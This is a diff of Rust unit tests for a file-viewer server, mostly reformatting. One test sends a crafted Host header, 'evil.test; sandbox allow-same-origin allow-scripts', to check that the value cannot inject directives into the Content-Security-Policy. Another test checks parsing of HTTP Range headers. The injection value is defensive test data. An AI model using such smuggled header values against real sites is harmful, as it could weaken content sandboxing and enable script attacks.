         fs::write(sub.join("x.txt"), "x").unwrap();
         let token = f.mount(&sub).await;
-        for host in ["evil.test; sandbox allow-same-origin allow-scripts", "a b", "h\u{e9}st"] {
+        for host in [
+            "evil.test; sandbox allow-same-origin allow-scripts",
+            "a b",
+            "h\u{e9}st",
+        ] {
             let uri = format!("/__viewer/{token}/x.txt");
             let req = Request::builder()
                 .uri(&uri)
-                .header(header::HOST, HeaderValue::from_bytes(host.as_bytes()).unwrap())
+                .header(
+                    header::HOST,
+                    HeaderValue::from_bytes(host.as_bytes()).unwrap(),
+                )
                 .body(Body::empty())
                 .unwrap();
             let resp = f.app.clone().oneshot(req).await.unwrap();
             assert_eq!(resp.status(), StatusCode::OK, "{host}");
-            let csp = resp.headers()[header::CONTENT_SECURITY_POLICY].to_str().unwrap();
+            let csp = resp.headers()[header::CONTENT_SECURITY_POLICY]
+                .to_str()
+                .unwrap();
             assert!(csp.starts_with("sandbox allow-scripts;"), "{host}: {csp}");
             assert!(!csp.contains("allow-same-origin"), "{host}: {csp}");
             assert!(!csp.contains("evil.test"), "{host}: {csp}");
@@ -996,7 +1398,15 @@ mod tests {
         for ok in ["bytes=0-9", "bytes=5-", "bytes=-5", "bytes=0-0"] {
             assert!(check(ok), "{ok}");
         }
-        for bad in ["bytes=", "bytes=-", "bytes=a-b", "bytes=0-1,3-4", "items=0-1", "0-9", "bytes=1"] {
+        for bad in [
+            "bytes=",
+            "bytes=-",
+            "bytes=a-b",
+            "bytes=0-1,3-4",
+            "items=0-1",
+            "0-9",
+            "bytes=1",
+        ] {
             assert!(!check(bad), "{bad}");
         }
     }
